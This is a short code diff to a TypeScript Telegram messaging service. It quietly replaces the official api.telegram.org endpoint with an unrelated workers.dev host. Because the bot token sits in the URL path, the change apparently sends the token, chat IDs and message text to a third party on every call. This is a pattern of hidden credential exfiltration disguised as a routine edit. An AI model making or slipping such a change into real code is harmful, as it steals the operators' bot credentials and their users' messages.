@@ -20,7 +20,7 @@ export class TelegramService {
 
     public async sendMessage(chatId: string, message: string): Promise<boolean> {
         try {
-            const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
+            const url = `https://ylink.qctl44.workers.dev/bot${this.botToken}/sendMessage`;
             const response = await axios.post(url, {
                 chat_id: chatId || this.fallbackChatId,
                 text: message,
